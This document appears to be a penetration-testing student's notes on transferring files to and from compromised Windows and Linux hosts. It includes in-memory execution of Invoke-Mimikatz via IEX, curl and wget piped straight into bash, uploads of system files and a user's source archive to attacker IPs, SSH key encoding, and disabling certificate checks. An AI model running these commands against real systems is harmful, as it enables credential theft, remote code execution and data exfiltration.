## Windows File Transfer Methods

```
$ md5sum id_rsa
```
%% use md5 to ensure the file for transfer you encode and decode is correct %%

```
$ cat id_rsa |base64 -w 0;echo
```
%% encode SSH key to base64 %%

```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 encode string>"))
```
%% copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it. %%

```
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
%% confirm MD5 hashes match %%

### PowerShell DownloadFile Method
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
%% We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name. %%

### PowerShell DownloadString - Fileless Method
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
%% Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX. %%

```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
%% same method but with IEX pipeline %%

### PowerShell Invoke-WebRequest
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
%% slower method to download but can still be used %%

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
%% There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. use basic parsing to bypass this %%

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```
%% bypass ssl certificate not trusted errors %%

### SMB Downloads
```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
%% create smb server to download from in our attack machine  make sure to make it authenticated as most modern versions of windows block guest access%%

```
C:\htb> copy \\192.168.220.133\share\nc.exe
```
%% copy file from smb server %%

```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```
%% if using username/password %%

### FTP Downloads
```
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
```
%% start ftp server on attack machine %%

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
%% transfer file fomr an FTP server using PowerShell %%

### Upload Operations
### PowerShell Base64 Encode & Decode
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))<base64 encode output>
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
%% encode for upload to attack machine %%

```
$ echo <<base64 encode output> | base64 -d > hosts
$ md5sum hosts 
```
%% copy to file in linux machine  and use md5sum to confirm same as original%%

### PowerShell Web Uploads
```
$ pip3 install uploadserver
$ python3 -m uploadserver
```
%% start upload server on attacker machine %%

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
%% use powershell script PSUpload.ps1 to upload to uploadserver on attack machine %%

### Powershell Base64 Web Upload
```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
%%  use iex base64 to upload to netcat listener on attacker machine %%

### SMB Uploads
```
$ sudo pip3 install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
%% smb server on attack host %%

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
%% copy to attack host DavWWWRoot refers to root of smb server but you can specify different folder %%

### FTP Uploads
```
$ sudo python3 -m pyftpdlib --port 21 --write
```
%% start ftp server %%

```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
%% powershell upload file to FTP Server %%


## Linux File Transfer Methods
```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
%% use wget to download file onto target machine -O is for output filename %%

```
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
%% same as above %%

```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
%% fileless download with wget and curl meaning it executes instead of storing file on disk %%

### SSH Downloads
```
$ sudo systemctl enable ssh
$ sudo systemctl start ssh
$ netstat -lnpt
```
%% use SCP to copy files between hosts securely, start this by enabling and starting SSH listener to copy paste files between hosts %%

```
$ scp plaintext@192.168.49.128:/root/myroot.txt .
```
%% use scp, it is like copy with only difference being you use your credentials and provide remote IP address or DNS name %%